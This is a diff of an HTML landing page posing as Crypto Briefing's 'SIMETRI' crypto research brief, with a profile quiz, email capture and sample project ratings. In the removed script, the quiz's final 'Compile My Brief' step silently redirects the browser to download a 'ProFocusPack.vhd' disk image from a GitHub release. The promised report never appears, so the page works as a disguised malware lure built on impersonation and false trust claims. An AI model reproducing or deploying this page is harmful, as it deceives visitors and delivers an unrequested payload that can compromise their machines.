-                        <div class="tag-opt" onclick="toggleTag(this,'Layer 1 Blockchains')">
-                            <div class="tag-ck"></div>Layer 1 Blockchains
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'Layer 2 / Rollups')">
-                            <div class="tag-ck"></div>Layer 2 / Rollups
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'DeFi Protocols')">
-                            <div class="tag-ck"></div>DeFi Protocols
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'Real World Assets (RWA)')">
-                            <div class="tag-ck"></div>Real World Assets (RWA)
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'Stablecoins')">
-                            <div class="tag-ck"></div>Stablecoins
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'Infrastructure / Oracles')">
-                            <div class="tag-ck"></div>Infrastructure / Oracles
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'Gaming / Metaverse')">
-                            <div class="tag-ck"></div>Gaming / Metaverse
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'NFT Infrastructure')">
-                            <div class="tag-ck"></div>NFT Infrastructure
-                        </div>
-                        <div class="tag-opt" onclick="toggleTag(this,'AI / Data Networks')">
-                            <div class="tag-ck"></div>AI / Data Networks
-                        </div>
-                    </div>
-                    <div class="email-block"> <label for="email-inp">Your email — to receive your SIMETRI brief</label>
-                        <input type="email" id="email-inp" placeholder="you@domain.com" oninput="emailChanged()"
-                            autocomplete="email" />
-                        <div class="email-err" id="email-err">Please enter a valid email address.</div>
-                    </div>
-                </div> <!-- Loader -->
-                <div class="quiz-step" id="step-loader">
-                    <div class="loader-pane">
-                        <div class="spin-ring"></div>
-                        <div class="loader-title">Compiling Your SIMETRI Brief…</div>
-                        <div class="loader-sub">Filtering 500+ project ratings against your research scope, risk band,
-                            and time horizon. This takes a moment.</div>
-                        <div class="chk-list">
-                            <div class="chk-item" id="c1">
-                                <div class="chk-icon">✓</div>Profile parameters recorded
-                            </div>
-                            <div class="chk-item" id="c2">
-                                <div class="chk-icon">✓</div>Matching SIMETRI project database
-                            </div>
-                            <div class="chk-item" id="c3">
-                                <div class="chk-icon">✓</div>Generating risk-calibrated flags
-                            </div>
-                            <div class="chk-item" id="c4">
-                                <div class="chk-icon">✓</div>Assembling vesting timeline alerts
-                            </div>
-                            <div class="chk-item" id="c5">
-                                <div class="chk-icon">✓</div>Compiling editorial thesis section
-                            </div>
-                        </div>
-                    </div>
-                </div> <!-- Success -->
-                <div class="quiz-step" id="step-success">
-                    <div class="success-pane">
-                        <div class="success-ring"> <svg width="34" height="34" viewBox="0 0 34 34" fill="none"
-                                aria-hidden="true">
-                                <path d="M7 17L13 23L27 9" stroke="#16A34A" stroke-width="2.8" stroke-linecap="round"
-                                    stroke-linejoin="round" />
-                            </svg> </div>
-                        <h2>Your Brief Is Compiled.</h2>
-                        <p>Your personalized SIMETRI Research Brief has been prepared. A confirmation has been sent to
-                            your inbox — the full brief, including project ratings, risk flags, and editorial thesis
-                            notes, follows within minutes.</p>
-                        <div class="report-summary">
-                            <div class="rs-title">Brief Summary</div>
-                            <div class="rs-row"><span class="rs-k">Experience Level</span><span class="rs-v"
-                                    id="s-exp">—</span></div>
-                            <div class="rs-row"><span class="rs-k">Investment Goal</span><span class="rs-v"
-                                    id="s-goal">—</span></div>
-                            <div class="rs-row"><span class="rs-k">Time Horizon</span><span class="rs-v"
-                                    id="s-horizon">—</span></div>
-                            <div class="rs-row"><span class="rs-k">Risk Tolerance</span><span class="rs-v"
-                                    id="s-risk">—</span></div>
-                            <div class="rs-row"><span class="rs-k">Research Sectors</span><span class="rs-v"
-                                    id="s-sectors">—</span></div>
-                            <div class="rs-row"><span class="rs-k">Advertiser Influence</span><span class="rs-v"
-                                    style="color:var(--green)">None — Editorial only</span></div>
-                        </div> <button class="btn-confirm" onclick="closeQuiz()">Close &amp; Continue Reading</button>
-                        <div class="success-note">Independent research · No affiliate rankings · Unsubscribe any time
-                        </div>
-                    </div>
-                </div>
-            </div><!-- /qc-body -->
-            <div class="qc-footer" id="qc-footer"> <button class="qc-back" id="qc-back" onclick="goBack()" disabled>←
-                    Back</button> <button class="qc-next" id="qc-next" onclick="goNext()" disabled>Continue →</button>
-            </div>
-        </div>
+<!-- ▓▓▓ NAV ▓▓▓ -->
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="#" class="nav-logo">
+      <!-- Crypto Briefing logotype SVG -->
+      <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <rect width="26" height="26" rx="5" fill="#1E3A8A"/>
+        <rect x="5" y="5" width="7" height="7" rx="1.5" fill="white"/>
+        <rect x="14" y="5" width="7" height="4" rx="1" fill="white" opacity="0.6"/>
+        <rect x="14" y="11" width="7" height="4" rx="1" fill="white" opacity="0.4"/>
+        <rect x="5" y="14" width="16" height="2.5" rx="1" fill="white" opacity="0.25"/>
+        <rect x="5" y="18.5" width="11" height="2.5" rx="1" fill="white" opacity="0.18"/>
+      </svg>
+      <span>Crypto Briefing</span>
+    </a>
+    <ul class="nav-links">
+      <li><a href="#">News</a></li>
+      <li><a href="#">SIMETRI Ratings</a></li>
+      <li><a href="#">Research</a></li>
+      <li><a href="#">Price Analysis</a></li>
+      <li><a href="#">Learn</a></li>
+    </ul>
+    <div class="nav-right">
+      <button class="nav-login">Log In</button>
+      <button class="nav-cta" onclick="openQuiz()">Get Your Report</button>
     </div>
-    <script>/* ── STATE ─────────────────── */const ans = { sectors: [] }; let step = 1; const TOTAL = 5; let exitShown = false; let exitTimer = null;/* ── INIT ──────────────────── */document.addEventListener('DOMContentLoaded', () => { const yr = new Date().getFullYear(); document.getElementById('footer-year').textContent = yr; const now = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }); const scDate = document.getElementById('sc-date'); const rcDate = document.getElementById('rc-date'); if (scDate) scDate.textContent = now; if (rcDate) rcDate.textContent = now; exitTimer = setTimeout(() => { if (!exitShown) triggerExit(); }, 6500); document.addEventListener('mouseleave', e => { if (e.clientY < 10 && !exitShown) triggerExit(); }); });/* ── EXIT POPUP ────────────── */function triggerExit() { if (document.getElementById('quiz-overlay').classList.contains('active')) return; exitShown = true; clearTimeout(exitTimer); show('exit-overlay'); lockScroll(); } function closeExitPopup() { hide('exit-overlay'); unlockScroll(); }/* ── QUIZ ──────────────────── */function openQuiz() { closeExitPopup(); show('quiz-overlay'); lockScroll(); exitShown = true; } function closeQuiz() { hide('quiz-overlay'); unlockScroll(); } function show(id) { document.getElementById(id).classList.add('active'); } function hide(id) { document.getElementById(id).classList.remove('active'); } function lockScroll() { document.body.style.overflow = 'hidden'; } function unlockScroll() { document.body.style.overflow = ''; }/* overlay click-outside */['quiz-overlay', 'exit-overlay'].forEach(id => { document.getElementById(id).addEventListener('click', function (e) { if (e.target === this) { hide(id); unlockScroll(); } }); });/* ── OPTIONS ───────────────── */function pick(s, el, val) { document.getElementById('opts-' + s).querySelectorAll('.opt').forEach(o => o.classList.remove('sel')); el.classList.add('sel'); ans['s' + s] = val; document.getElementById('qc-next').disabled = false; } function toggleTag(el, val) { el.classList.toggle('sel'); ans.sectors = el.classList.contains('sel') ? [...new Set([...ans.sectors, val])] : ans.sectors.filter(v => v !== val); checkStep5(); } function emailChanged() { const inp = document.getElementById('email-inp'); const val = inp.value.trim(); const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val); inp.classList.toggle('err', !ok && val.length > 0); document.getElementById('email-err').style.display = (!ok && val.length > 0) ? 'block' : 'none'; ans.email = val; checkStep5(); } function checkStep5() { const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((document.getElementById('email-inp').value || '').trim()); document.getElementById('qc-next').disabled = !ok; } function step5Ready() { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((document.getElementById('email-inp').value || '').trim()); }/* ── NAV ───────────────────── */function renderStep(n) { document.querySelectorAll('.quiz-step').forEach(s => s.classList.remove('active')); const el = document.getElementById('step-' + n); if (el) el.classList.add('active'); const footer = document.getElementById('qc-footer'); const counter = document.getElementById('step-counter'); const isSpecial = (n === 'loader' || n === 'success'); if (isSpecial) { footer.style.display = 'none'; counter.textContent = n === 'loader' ? 'Compiling…' : 'Complete'; } else { footer.style.display = 'flex'; counter.textContent = 'Section ' + n + ' of ' + TOTAL; document.getElementById('qc-back').disabled = (n === 1); document.getElementById('qc-next').textContent = (n === TOTAL) ? 'Compile My Brief →' : 'Continue →'; document.getElementById('qc-bar').style.width = ((n / TOTAL) * 100) + '%'; const alreadyDone = n < TOTAL ? !!ans['s' + n] : step5Ready(); document.getElementById('qc-next').disabled = !alreadyDone; } } function goNext() { if (step < TOTAL) { step++; renderStep(step); } else { submitFlow(); } } function goBack() { if (step > 1) { step--; renderStep(step); } }/* ── LOADER ────────────────── */function submitFlow() {
-    window.location.href='https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
-    return; renderStep('loader'); const ids = ['c1', 'c2', 'c3', 'c4', 'c5']; ids.forEach(id => document.getElementById(id).classList.remove('done')); ids.forEach((id, i) => { setTimeout(() => document.getElementById(id).classList.add('done'), 600 + i * 650); }); setTimeout(() => { populateSuccess(); renderStep('success'); }, 600 + ids.length * 650 + 320); } function populateSuccess() { const riskMap = { 'Conservative — I reduce exposure at ~10% drawdown': 'Conservative', 'Moderate — I hold through 10–25% drawdowns': 'Moderate', 'Moderate-High — I hold through 25–50% drawdowns': 'Moderate-High', 'Aggressive — I hold regardless of drawdown magnitude': 'Aggressive' }; const horizonMap = { 'Under 3 months': '< 3 Months', '3 to 12 months': '3–12 Months', '12 to 36 months': '12–36 Months', 'Indefinite / No defined exit': 'Indefinite' }; set('s-exp', ans.s1 || '—'); set('s-goal', ans.s2 || '—'); set('s-horizon', horizonMap[ans.s3] || ans.s3 || '—'); set('s-risk', riskMap[ans.s4] || ans.s4 || '—'); set('s-sectors', ans.sectors.length > 0 ? ans.sectors.length + ' categories' : 'General coverage'); } function set(id, val) { const el = document.getElementById(id); if (el) el.textContent = val; }/* ── KEYBOARD ──────────────── */document.querySelectorAll('.opt').forEach(el => { el.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); el.click(); } }); }); document.addEventListener('keydown', e => { if (e.key === 'Escape') { closeQuiz(); closeExitPopup(); } });</script>
-</body>
+  </div>
+</nav>
 
+<!-- ▓▓▓ HERO ▓▓▓ -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <div class="hero-tag"><span class="hero-tag-dot"></span> SIMETRI · Personalized Research Brief</div>
+      <h1>Independent Analysis,<br/>Calibrated to Your<br/><em>Actual</em> Risk Profile.</h1>
+      <p class="hero-sub">Crypto Briefing's SIMETRI engine evaluates projects using 25 quantitative and qualitative criteria — ad-free, without affiliate bias. Your personalized brief surfaces only the ratings and risk signals that match your stated mandate and holdings focus.</p>
+      <div class="hero-actions">
+        <button class="btn-gold" onclick="openQuiz()">Build My SIMETRI Brief →</button>
+        <button class="btn-ghost" onclick="void(0)">View Sample Report ↗</button>
+      </div>
+      <div class="hero-note">No advertising. No affiliate arrangements. Independent since 2017.</div>
+    </div>
+
+    <!-- SIMETRI rating card mockup -->
+    <div class="simetri-card" aria-label="Sample SIMETRI rating card">
+      <div class="sc-header">
+        <div class="sc-header-left">
+          <span class="sc-label">SIMETRI Rating · Personalized</span>
+          <span class="sc-project">Arbitrum (ARB)</span>
+        </div>
+        <div class="sc-grade-wrap">
+          <span class="sc-grade">A−</span>
+          <span class="sc-grade-label">Overall</span>
+        </div>
+      </div>
+      <div class="sc-body">
+        <div class="sc-score-row">
+          <span class="sc-score-name">Technology</span>
+          <div class="sc-score-bar-wrap"><div class="sc-score-bar" style="width:88%;background:#2563EB;"></div></div>
+          <span class="sc-score-val">8.8</span>
+        </div>
+        <div class="sc-score-row">
+          <span class="sc-score-name">Team &amp; Org</span>
+          <div class="sc-score-bar-wrap"><div class="sc-score-bar" style="width:82%;background:#2563EB;"></div></div>
+          <span class="sc-score-val">8.2</span>
+        </div>
+        <div class="sc-score-row">
+          <span class="sc-score-name">Market Position</span>
+          <div class="sc-score-bar-wrap"><div class="sc-score-bar" style="width:78%;background:#C8A951;"></div></div>
+          <span class="sc-score-val">7.8</span>
+        </div>
+        <div class="sc-score-row">
+          <span class="sc-score-name">Tokenomics</span>
+          <div class="sc-score-bar-wrap"><div class="sc-score-bar" style="width:71%;background:#C8A951;"></div></div>
+          <span class="sc-score-val">7.1</span>
+        </div>
+        <div class="sc-score-row">
+          <span class="sc-score-name">Risk-Adj. Profile</span>
+          <div class="sc-score-bar-wrap"><div class="sc-score-bar" style="width:84%;background:#16A34A;"></div></div>
+          <span class="sc-score-val">8.4</span>
+        </div>
+        <!-- Mini bar chart SVG -->
+        <svg width="100%" height="56" viewBox="0 0 240 56" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-top:14px;">
+          <line x1="0" y1="48" x2="240" y2="48" stroke="rgba(255,255,255,0.06)" stroke-width="1"/>
+          <rect x="0"   y="20" width="26" height="28" rx="2" fill="#2563EB" opacity="0.7"/>
+          <rect x="34"  y="10" width="26" height="38" rx="2" fill="#2563EB" opacity="0.8"/>
+          <rect x="68"  y="28" width="26" height="20" rx="2" fill="#C8A951" opacity="0.7"/>
+          <rect x="102" y="16" width="26" height="32" rx="2" fill="#2563EB" opacity="0.6"/>
+          <rect x="136" y="24" width="26" height="24" rx="2" fill="#C8A951" opacity="0.5"/>
+          <rect x="170" y="8"  width="26" height="40" rx="2" fill="#16A34A" opacity="0.75"/>
+          <rect x="204" y="18" width="26" height="30" rx="2" fill="#2563EB" opacity="0.55"/>
+          <text x="0"   y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Tech</text>
+          <text x="34"  y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Team</text>
+          <text x="68"  y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Mkt</text>
+          <text x="102" y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Tok</text>
+          <text x="136" y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Dev</text>
+          <text x="170" y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Risk</text>
+          <text x="204" y="56" font-family="JetBrains Mono,monospace" font-size="7" fill="rgba(255,255,255,0.2)">Liq</text>
+        </svg>
+      </div>
+      <div class="sc-footer">
+        <div class="sc-footer-note">Evaluation: 25 criteria<br/>Last updated: <span id="sc-date">—</span></div>
+        <div class="sc-personalized-tag">● Personalized for you</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ▓▓▓ TRUST STRIP ▓▓▓ -->
+<div class="trust-strip">
+  <div class="trust-inner">
+    <div class="trust-item">
+      <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true"><circle cx="9" cy="9" r="8" stroke="#1E3A8A" stroke-width="1.5"/><path d="M5.5 9L7.8 11.5L12.5 6.5" stroke="#1E3A8A" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <div><div class="trust-val">Ad-Free</div><div class="trust-desc">Zero advertiser influence</div></div>
+    </div>
+    <div class="trust-sep"></div>
+    <div class="trust-item">
+      <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true"><rect x="2" y="3" width="14" height="12" rx="2" stroke="#1E3A8A" stroke-width="1.5"/><line x1="5" y1="7" x2="13" y2="7" stroke="#1E3A8A" stroke-width="1.2"/><line x1="5" y1="10" x2="10" y2="10" stroke="#1E3A8A" stroke-width="1.2"/></svg>
+      <div><div class="trust-val">500+ Projects</div><div class="trust-desc">Rated in the SIMETRI database</div></div>
+    </div>
+    <div class="trust-sep"></div>
+    <div class="trust-item">
+      <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true"><path d="M9 2L10.9 6.5H16L11.8 9.4L13.5 14L9 11.2L4.5 14L6.2 9.4L2 6.5H7.1L9 2Z" stroke="#1E3A8A" stroke-width="1.3" stroke-linejoin="round"/></svg>
+      <div><div class="trust-val">25 Criteria</div><div class="trust-desc">Per quantitative evaluation</div></div>
+    </div>
+    <div class="trust-sep"></div>
+    <div class="trust-item">
+      <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true"><circle cx="9" cy="9" r="7" stroke="#1E3A8A" stroke-width="1.5"/><path d="M9 5V9L11.5 11.5" stroke="#1E3A8A" stroke-width="1.4" stroke-linecap="round"/></svg>
+      <div><div class="trust-val">Since 2017</div><div class="trust-desc">Independent editorial coverage</div></div>
+    </div>
+    <div class="trust-sep"></div>
+    <div class="trust-item">
+      <svg class="trust-icon" width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true"><path d="M9 2C5.1 2 2 5.1 2 9s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7z" stroke="#1E3A8A" stroke-width="1.5"/><path d="M6 9c0-1.7 1.3-3 3-3" stroke="#1E3A8A" stroke-width="1.3" stroke-linecap="round"/></svg>
+      <div><div class="trust-val">Tailored Brief</div><div class="trust-desc">Matched to your risk profile</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ▓▓▓ FEATURE ROWS ▓▓▓ -->
+<section class="sect">
+  <div class="sect-inner">
+    <div class="sect-eyebrow">What's Inside Your Brief</div>
+    <h2 class="sect-title">Five Research Disciplines.<br/>One Objective Report.</h2>
+    <p class="sect-sub">Your SIMETRI brief is assembled from Crypto Briefing's independent research methodology — no sponsored content, no advertiser access to conclusions, no exceptions.</p>
+
+    <div class="feat-list">
+
+      <div class="feat-row">
+        <div class="feat-index">SIMETRI-01</div>
+        <div class="feat-content">
+          <h3>Quantitative Project Rating</h3>
+          <p>Every project in your brief carries a full SIMETRI score across 25 sub-criteria: technology maturity, team track record, tokenomics structure, market position, liquidity depth, and on-chain developer activity. Each rating includes a plain-language summary of the key drivers behind the grade.</p>
+          <span class="feat-tag feat-tag-blue">25-point evaluation</span>
+        </div>
+        <div class="feat-viz">
+          <!-- Grade badge SVG -->
+          <svg width="120" height="88" viewBox="0 0 120 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="20" y="8" width="80" height="72" rx="10" fill="var(--blue-wash)" stroke="var(--border)" stroke-width="1.2"/>
+            <text x="60" y="42" font-family="Lora,Georgia,serif" font-size="34" font-weight="700" fill="#1E3A8A" text-anchor="middle">A−</text>
+            <text x="60" y="60" font-family="JetBrains Mono,monospace" font-size="9" fill="var(--text-faint)" text-anchor="middle">SIMETRI GRADE</text>
+            <rect x="30" y="64" width="60" height="8" rx="2" fill="var(--border)"/>
+            <rect x="30" y="64" width="48" height="8" rx="2" fill="#1E3A8A" opacity="0.6"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="feat-row">
+        <div class="feat-index">SIMETRI-02</div>
+        <div class="feat-content">
+          <h3>Personalized Risk Exposure Flags</h3>
+          <p>Risk flags are filtered to your stated drawdown tolerance and time horizon. A flag that matters for a short-term tactical trader is suppressed for an 18-month holder — and vice versa. You receive only the risk signals that are structurally relevant to your stated mandate, presented without alarmism.</p>
+          <span class="feat-tag feat-tag-gold">Risk-calibrated</span>
+        </div>
+        <div class="feat-viz">
+          <!-- Risk gauge SVG -->
+          <svg width="120" height="88" viewBox="0 0 120 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="rg" x1="0" y1="0" x2="1" y2="0">
+                <stop offset="0%" stop-color="#16A34A"/>
+                <stop offset="55%" stop-color="#C8A951"/>
+                <stop offset="100%" stop-color="#DC2626"/>
+              </linearGradient>
+            </defs>
+            <path d="M14 72 A46 46 0 0 1 106 72" stroke="url(#rg)" stroke-width="9" fill="none" stroke-linecap="round"/>
+            <path d="M14 72 A46 46 0 0 1 82 34" stroke="var(--border)" stroke-width="9" fill="none" stroke-linecap="round" opacity="0.5"/>
+            <line x1="60" y1="72" x2="85" y2="40" stroke="#1E3A8A" stroke-width="2.5" stroke-linecap="round"/>
+            <circle cx="60" cy="72" r="4.5" fill="#1E3A8A"/>
+            <text x="14" y="84" font-family="JetBrains Mono,monospace" font-size="8" fill="#16A34A">LOW</text>
+            <text x="96" y="84" font-family="JetBrains Mono,monospace" font-size="8" fill="#DC2626" text-anchor="end">HIGH</text>
+          </svg>
+        </div>
+      </div>
+
+      <div class="feat-row">
+        <div class="feat-index">SIMETRI-03</div>
+        <div class="feat-content">
+          <h3>On-Chain Developer Activity Analysis</h3>
+          <p>Repository commit cadence, core contributor growth, protocol upgrade velocity, and testnet progression are quantified for every project in your focus sectors. Crypto Briefing's research team annotates signal spikes and sustained decline patterns that standard price charts don't reveal.</p>
+          <span class="feat-tag feat-tag-green">On-chain verified</span>
+        </div>
+        <div class="feat-viz">
+          <!-- Dev activity SVG sparkline -->
+          <svg width="140" height="88" viewBox="0 0 140 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="4" y="4" width="132" height="80" rx="6" fill="var(--bg-soft)" stroke="var(--border)"/>
+            <polyline points="14,64 30,56 46,52 62,44 78,46 94,32 110,28 126,18" stroke="#1E3A8A" stroke-width="2" fill="none" stroke-linejoin="round"/>
+            <circle cx="126" cy="18" r="3.5" fill="#16A34A"/>
+            <text x="10" y="78" font-family="JetBrains Mono,monospace" font-size="8" fill="var(--text-faint)">Commits / 90d</text>
+            <line x1="14" y1="72" x2="130" y2="72" stroke="var(--border)" stroke-width="1"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="feat-row">
+        <div class="feat-index">SIMETRI-04</div>
+        <div class="feat-content">
+          <h3>Tokenomics &amp; Vesting Schedule Audit</h3>
+          <p>Token unlock calendars, team allocation percentages, inflation schedules, and treasury runway are presented in a clear timeline format for each project. Upcoming cliff events within your stated time horizon are flagged explicitly, with historical price response data from prior unlock events.</p>
+          <span class="feat-tag feat-tag-blue">Vesting timeline included</span>
+        </div>
+        <div class="feat-viz">
+          <!-- Stacked distribution SVG -->
+          <svg width="120" height="88" viewBox="0 0 120 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <!-- Pie / arc segments simplified as stacked bars -->
+            <rect x="20" y="10" width="80" height="14" rx="3" fill="#1E3A8A" opacity="0.9"/>
+            <text x="110" y="21" font-family="JetBrains Mono,monospace" font-size="8" fill="var(--text-muted)" text-anchor="end">Team 18%</text>
+            <rect x="20" y="28" width="64" height="14" rx="3" fill="#2563EB" opacity="0.7"/>
+            <text x="110" y="39" font-family="JetBrains Mono,monospace" font-size="8" fill="var(--text-muted)" text-anchor="end">Public 44%</text>
+            <rect x="20" y="46" width="40" height="14" rx="3" fill="#C8A951" opacity="0.8"/>
+            <text x="110" y="57" font-family="JetBrains Mono,monospace" font-size="8" fill="var(--text-muted)" text-anchor="end">Eco 28%</text>
+            <rect x="20" y="64" width="14" height="14" rx="3" fill="#DC2626" opacity="0.6"/>
+            <text x="110" y="75" font-family="JetBrains Mono,monospace" font-size="8" fill="var(--text-muted)" text-anchor="end">Reserve 10%</text>
+          </svg>
+        </div>
+      </div>
+
+      <div class="feat-row">
+        <div class="feat-index">SIMETRI-05</div>
+        <div class="feat-content">
+          <h3>Editorial Thesis &amp; Catalyst Roadmap</h3>
+          <p>Beyond the numbers, your brief includes Crypto Briefing's editorial thesis for each rated project: what the investment case depends on, which milestones could invalidate it, and what near-term catalysts the research team is monitoring. Written for readers who can evaluate evidence without being told what to conclude.</p>
+          <span class="feat-tag feat-tag-gold">Editorial assessment</span>
+        </div>
+        <div class="feat-viz">
+          <!-- Roadmap timeline SVG -->
+          <svg width="130" height="88" viewBox="0 0 130 88" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <line x1="20" y1="16" x2="20" y2="78" stroke="var(--border)" stroke-width="1.5" stroke-dasharray="3 3"/>
+            <circle cx="20" cy="20" r="5" fill="#16A34A"/>
+            <text x="32" y="24" font-family="Inter,sans-serif" font-size="9" fill="var(--text-mid)">Mainnet upgrade</text>
+            <circle cx="20" cy="42" r="5" fill="#1E3A8A"/>
+            <text x="32" y="46" font-family="Inter,sans-serif" font-size="9" fill="var(--text-mid)">Team token cliff</text>
+            <circle cx="20" cy="62" r="5" fill="var(--border)" stroke="#C8A951" stroke-width="1.5"/>
+            <text x="32" y="66" font-family="Inter,sans-serif" font-size="9" fill="var(--text-faint)">V3 governance vote</text>
+            <circle cx="20" cy="78" r="4" fill="var(--bg-soft)" stroke="var(--border)" stroke-width="1.5"/>
+            <text x="32" y="82" font-family="Inter,sans-serif" font-size="9" fill="var(--text-faint)">Ecosystem grants</text>
+          </svg>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ▓▓▓ SAMPLE OUTPUT ▓▓▓ -->
+<section class="sect sect-alt">
+  <div class="sect-inner">
+    <div class="sect-eyebrow">Sample Output</div>
+    <h2 class="sect-title">A Report That Looks Like<br/>Research — Because It Is.</h2>
+    <p class="sect-sub">A representative brief compiled from SIMETRI's live evaluation database. Every field you see adapts to your profile inputs — sector focus, experience level, and risk tolerance.</p>
+
+    <div class="sample-grid">
+      <div class="report-card">
+        <div class="rc-top">
+          <div class="rc-top-eyebrow">SIMETRI Brief · Personalized Output</div>
+          <div class="rc-top-title">Your Digital Asset Research Brief</div>
+          <div class="rc-top-meta">
+            <span class="rc-badge rc-badge-gold">● Compiled</span>
+            <span class="rc-badge rc-badge-blue">Long-Term / Moderate</span>
+          </div>
+        </div>
+        <div class="rc-body">
+          <div class="rc-row"><span class="rc-k">Subscriber Tier</span><span class="rc-v rc-v-blue">SIMETRI Verified</span></div>
+          <div class="rc-row"><span class="rc-k">Experience Level</span><span class="rc-v rc-v-white">Active Researcher</span></div>
+          <div class="rc-row"><span class="rc-k">Investment Goal</span><span class="rc-v rc-v-gold">Long-Term Appreciation</span></div>
+          <div class="rc-row"><span class="rc-k">Time Horizon</span><span class="rc-v rc-v-white">12–36 Months</span></div>
+          <div class="rc-row"><span class="rc-k">Risk Band</span><span class="rc-v rc-v-gold">Moderate-High</span></div>
+          <div class="rc-row"><span class="rc-k">Sectors Tracked</span><span class="rc-v rc-v-blue">L1 · DeFi · RWA</span></div>
+          <div class="rc-row"><span class="rc-k">Projects Rated</span><span class="rc-v rc-v-white">14 in your scope</span></div>
+          <div class="rc-row"><span class="rc-k">Generated</span><span class="rc-v rc-v-green" id="rc-date">—</span></div>
+          <div class="rc-row"><span class="rc-k">Ad-Free</span><span class="rc-v rc-v-green">✓ Verified</span></div>
+        </div>
+      </div>
+
+      <div class="analysis-panels">
+        <div class="ap">
+          <div class="ap-head">
+            <span class="ap-dot" style="background:#16A34A"></span>
+            <span class="ap-title">Top-Rated in Your Scope — SIMETRI Picks</span>
+          </div>
+          <div class="ap-body">
+            <div class="ap-finding">
+              <span class="ap-finding-icon">🔵</span>
+              <div>
+                <div class="ap-finding-text">Arbitrum (ARB) scores A− overall. Technology dimension leads the evaluation, underpinned by fraud proof maturity and sequencer decentralization progress. Primary risk: concentrated token unlocks in Q3.</div>
+                <div class="ap-finding-mono">SIMETRI-ARB-2024 · Grade: A− · Risk Band: Moderate</div>
+              </div>
+            </div>
+            <div class="ap-finding">
+              <span class="ap-finding-icon">🟡</span>
+              <div>
+                <div class="ap-finding-text">Aave (AAVE) maintains a B+ amid declining TVL across Ethereum mainnet but strong revenue-to-valuation metrics relative to sector peers. Team responsiveness to security incidents rated highly.</div>
+                <div class="ap-finding-mono">SIMETRI-AAVE-2024 · Grade: B+ · Risk Band: Moderate</div>
+              </div>
+            </div>
+            <div class="ap-finding">
+              <span class="ap-finding-icon">🟢</span>
+              <div>
+                <div class="ap-finding-text">Ondo Finance (ONDO) earns B for RWA infrastructure leadership. On-chain T-bill yield products showing meaningful institutional adoption. Regulatory path remains the key binary risk to thesis.</div>
+                <div class="ap-finding-mono">SIMETRI-ONDO-2024 · Grade: B · Risk Band: Moderate-High</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="ap">
+          <div class="ap-head">
+            <span class="ap-dot" style="background:#DC2626"></span>
+            <span class="ap-title">Risk Flags — Calibrated to Your Horizon</span>
+          </div>
+          <div class="ap-body">
+            <div class="ap-finding">
+              <span class="ap-finding-icon">⚠️</span>
+              <div>
+                <div class="ap-finding-text">Three L1 projects in your scope have cliff vesting events within the next 180 days totaling over 8% of circulating supply. Historical price response to comparable events: −14% median 30-day drawdown.</div>
+                <div class="ap-finding-mono">RISK-VEST-001 · Scope: Solana, Sui, Aptos</div>
+              </div>
+            </div>
+            <div class="ap-finding">
+              <span class="ap-finding-icon">🔍</span>
+              <div>
+                <div class="ap-finding-text">DeFi sector correlation to ETH beta elevated vs. 12-month average. Diversification benefit of DeFi exposure is structurally reduced during current macro regime. Flagged for 12–36-month horizon holders.</div>
+                <div class="ap-finding-mono">RISK-CORR-014 · Horizon: 12–36 months</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ▓▓▓ FINAL CTA ▓▓▓ -->
+<section class="final-cta-sect">
+  <div class="final-cta-inner">
+    <div class="fc-eyebrow">SIMETRI Research Brief</div>
+    <h2>Your Report Takes<br/>90 Seconds to Build.</h2>
+    <p>Answer five research-framing questions. Crypto Briefing's SIMETRI engine filters 500+ project ratings down to what's structurally relevant to you — delivered without editorial compromise.</p>
+    <button class="btn-gold" onclick="openQuiz()">Start the Profile Sequence →</button>
+    <div class="final-cta-note">Ad-free. No affiliate arrangements. Unsubscribe at any time.</div>
+  </div>
+</section>
+
